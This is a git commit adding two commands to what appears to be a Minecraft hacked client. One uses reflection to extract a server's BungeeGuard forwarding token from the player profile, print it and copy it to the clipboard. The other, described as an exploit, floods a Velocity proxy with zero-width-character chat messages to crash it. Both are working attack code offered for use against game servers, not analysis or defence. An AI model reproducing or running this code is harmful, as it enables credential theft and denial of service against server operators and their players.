93e5fed26b403dcd7052d638d8922eaf1ae302ca
Zyaris <164185653+zyaris0@users.noreply.github.com>
2025-11-05 06:51:12 +0530

    Add files via upload

---
+++ src/main/java/net/paradise_client/command/impl/BungeeGuardCommand.java
@@ -0,0 +1,94 @@
+package dev.atlasclient.command.impl;
+
+import com.mojang.authlib.GameProfile;
+import com.mojang.authlib.properties.Property;
+import com.mojang.authlib.properties.PropertyMap;
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
+import com.mojang.brigadier.context.CommandContext;
+
+import net.minecraft.client.MinecraftClient;
+import net.minecraft.client.network.ClientPlayerEntity;
+import net.minecraft.command.CommandSource;
+
+import dev.atlasclient.Helper;
+import dev.atlasclient.command.Command;
+
+import java.awt.*;
+import java.awt.datatransfer.StringSelection;
+import java.lang.reflect.Field;
+import java.util.Collection;
+
+public class BungeeGuardCommand extends Command {
+
+    public BungeeGuardCommand() {
+        super("bungeeguard", "Checks for BungeeGuard token");
+    }
+
+    @Override
+    public void build(LiteralArgumentBuilder<CommandSource> builder) {
+        builder.executes(this::execute);
+    }
+
+    private int execute(CommandContext<CommandSource> context) {
+        checkForBungeeGuardToken();
+        return 1;
+    }
+
+    private void checkForBungeeGuardToken() {
+        MinecraftClient client = MinecraftClient.getInstance();
+        ClientPlayerEntity player = client.player;
+
+        if (player == null || client.getNetworkHandler() == null) {
+            Helper.printChatMessage("§cYou must be connected to a server!");
+            return;
+        }
+
+        GameProfile profile = player.getGameProfile();
+        PropertyMap properties = profile.getProperties();
+
+        Property tokenProperty = null;
+        Collection<Property> values = properties.values();
+        for (Property property : values) {
+            String name = getPrivateField(property, "name");
+            if ("bungeeguard-token".equals(name)) {
+                tokenProperty = property;
+                break;
+            }
+        }
+
+        if (tokenProperty != null) {
+            String token = getPrivateField(tokenProperty, "value");
+            if (token != null) {
+                copyToClipboard(token);
+                Helper.printChatMessage("§aBungeeGuard token found: §b§n" + token);
+            } else {
+                Helper.printChatMessage("§cCould not read token value");
+            }
+        } else {
+            Helper.printChatMessage("§4No BungeeGuard token found");
+        }
+    }
+
+    private void copyToClipboard(String token) {
+        try {
+            Toolkit.getDefaultToolkit().getSystemClipboard()
+                    .setContents(new StringSelection(token), null);
+            Helper.printChatMessage("§aToken copied to clipboard");
+        } catch (Exception e) {
+            Helper.printChatMessage("§cFailed to copy token to clipboard");
+            e.printStackTrace();
+        }
+    }
+
+    @SuppressWarnings("unchecked")
+    private String getPrivateField(Property property, String fieldName) {
+        try {
+            Field field = Property.class.getDeclaredField(fieldName);
+            field.setAccessible(true);
+            return (String) field.get(property);
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
+    }
+}
---
+++ src/main/java/net/paradise_client/command/impl/VelocityCrasherCommand.java
@@ -0,0 +1,84 @@
+package dev.atlasclient.command.impl;
+
+import com.mojang.brigadier.arguments.IntegerArgumentType;
+import com.mojang.brigadier.arguments.StringArgumentType;
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
+import com.mojang.brigadier.builder.RequiredArgumentBuilder;
+import com.mojang.brigadier.context.CommandContext;
+import dev.atlasclient.command.Command;
+import net.minecraft.client.network.ClientPlayNetworkHandler;
+import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
+import net.minecraft.command.CommandSource;
+import net.minecraft.network.PacketByteBuf;
+import io.netty.buffer.Unpooled;
+
+/**
+ * Command: Velocity Proxy Crasher
+ */
+public class VelocityCrasherCommand extends Command {
+
+    public VelocityCrasherCommand() {
+        super("velocitycrasher", "Velocity proxy crasher");
+    }
+
+    /**
+     * Register command arguments
+     */
+    @Override
+    public void build(LiteralArgumentBuilder<CommandSource> root) {
+        LiteralArgumentBuilder<CommandSource> literal = root.executes(ctx -> executeDefault(ctx));
+
+        RequiredArgumentBuilder<CommandSource, String> serverArg =
+                RequiredArgumentBuilder.<CommandSource, String>argument("server", StringArgumentType.word())
+                        .executes(ctx -> executeDefault(ctx));
+
+        RequiredArgumentBuilder<CommandSource, Integer> powerArg =
+                RequiredArgumentBuilder.<CommandSource, Integer>argument("power", IntegerArgumentType.integer(200))
+                        .executes(ctx -> executeAttack(ctx));
+
+        serverArg.then(powerArg);
+        literal.then(serverArg);
+    }
+
+    /**
+     * Executes the exploit logic
+     */
+    private int executeAttack(CommandContext<CommandSource> ctx) {
+        Runnable task = () -> {
+            if (this.getMinecraftClient().player == null
+                    || this.getMinecraftClient().getNetworkHandler() == null) {
+                return;
+            }
+
+            ClientPlayNetworkHandler net = this.getMinecraftClient().getNetworkHandler();
+            String server = ctx.getArgument("server", String.class);
+            int power = ctx.getArgument("power", Integer.class);
+
+            String filler = "\u200d"; // Zero-width joiner
+            String message = "server " + server + " " + filler.repeat(power);
+
+            for (int i = 0; i < 200; i++) {
+                // Create PacketByteBuf and write the chat message
+                PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
+                buf.writeString(message);
+                this.getMinecraftClient().player.networkHandler.sendChatMessage(message);
+            }
+
+            try {
+                Thread.sleep(50L);
+            } catch (InterruptedException ie) {
+                Thread.currentThread().interrupt();
+            }
+        };
+
+        new Thread(task, "VelocityCrasher").start();
+        return 1;
+    }
+
+    /**
+     * Default execution if no arguments provided
+     */
+    private int executeDefault(CommandContext<CommandSource> ctx) {
+        return 1;
+    }
+}
